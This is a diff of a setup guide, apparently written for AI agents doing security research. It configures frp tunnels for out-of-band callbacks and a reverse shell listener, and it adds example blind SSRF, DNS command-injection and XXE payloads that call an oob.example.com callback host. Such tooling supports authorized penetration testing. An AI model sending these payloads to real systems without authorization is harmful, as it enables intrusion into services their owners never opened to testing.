@@ -78,9 +78,15 @@ A single config file defines all tunnels. Write it to `/data/frpc.toml` inside t
 interactsh binds to the container's bridge IP, not loopback. The config must use that IP
 for `localIP` so frpc can reach the interactsh listeners. The snippet below auto-detects it.
 
+**Proxy names must be globally unique** across all frpc clients connecting to the same frps.
+The config auto-prefixes names with the container hostname (first 8 chars) to avoid collisions
+when multiple machines share the frp server. `heartbeatTimeout = 30` on frps ensures stale
+clients release their names within 30 seconds.
+
 ```bash
 docker exec security-research bash -c '
 CONTAINER_IP=$(hostname -i | awk "{print \$1}")
+CLIENT_PREFIX=$(hostname -s | tr "[:upper:]" "[:lower:]" | cut -c1-8)
 cat > /data/frpc.toml << FRPEOF
 serverAddr = "oob-relay.example.com"
 serverPort = 7000
@@ -92,7 +98,7 @@ loginFailExit = false
 # OOB DNS — primary callback mechanism (UDP, port 53)
 # Requires NS record: oob NS oob-relay.example.com
 [[proxies]]
-name = "oob-dns"
+name = "${CLIENT_PREFIX}-oob-dns"
 type = "udp"
 localIP = "${CONTAINER_IP}"
 localPort = 53
@@ -100,7 +106,7 @@ remotePort = 53
 
 # OOB HTTP — interactsh client polling + callback subdomains via Caddy
 [[proxies]]
-name = "oob"
+name = "${CLIENT_PREFIX}-oob"
 type = "http"
 localIP = "${CONTAINER_IP}"
 localPort = 80
@@ -108,13 +114,13 @@ customDomains = ["oob.example.com", "*.oob.example.com"]
 
 # Reverse shell listener (TCP, port 4444)
 [[proxies]]
-name = "oob-rev"
+name = "${CLIENT_PREFIX}-oob-rev"
 type = "tcp"
 localIP = "${CONTAINER_IP}"
 localPort = 4444
 remotePort = 8443
 FRPEOF
-echo "[frpc] localIP set to ${CONTAINER_IP}"
+echo "[frpc] localIP=${CONTAINER_IP} prefix=${CLIENT_PREFIX}"
 '
 ```
 
@@ -317,6 +323,49 @@ Use only for debugging, not for confirming OOB hits during an engagement.
 ```bash
 docker exec security-research tail -50 /data/oob-server.log
 ```
+
+### Using OOB callbacks in exploit payloads
+
+When exploit-developer or vulnerability-analyst needs OOB detection for blind vulnerabilities:
+
+1. **Check if OOB is available:** read `$DIR/.oob_url`. If the file exists, OOB is provisioned.
+
+2. **Get a per-session callback URL** from interactsh-client:
+   ```bash
+   # Read the correlation URL from the client log (first URL printed at startup)
+   grep -oE '[a-z0-9]+\.oob\.example-operatoreng\.com' /data/oob-client.log | head -1
+   ```
+   This URL is unique per interactsh-client session. All callbacks containing its correlation
+   prefix are automatically filtered and shown in `/data/oob-client.log`.
+
+3. **Embed the callback URL in payloads** — use the full correlation URL, not the base domain:
+   ```
+   # Blind SSRF
+   http://<correlation-id>.oob.example.com/ssrf-endpoint-name
+
+   # Blind command injection (DNS)
+   nslookup <correlation-id>.oob.example.com
+
+   # Blind XXE
+   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<correlation-id>.oob.example.com/xxe">]>
+   ```
+
+   **Tip:** Append the endpoint name or test label as a URL path suffix so you can identify
+   which payload triggered the callback:
+   ```
+   http://<correlation-id>.oob.example.com/webhook-ssrf-test
+   http://<correlation-id>.oob.example.com/xxe-users-endpoint
+   ```
+
+4. **Check for hits** via Kali MCP after sending payloads:
+   ```bash
+   tail -50 /data/oob-client.log    # Correlated hits only (preferred)
+   tail -50 /data/oob-server.log    # Raw log (noisy, for debugging)
+   ```
+
+5. **If OOB is not available:** fall back to time-based detection (sleep payloads) and note
+   in output that OOB was unavailable. If time-based also fails and OOB would have been
+   decisive, stop and ask the operator to provision interactsh + frp tunnels per this file.
 
 ---
 
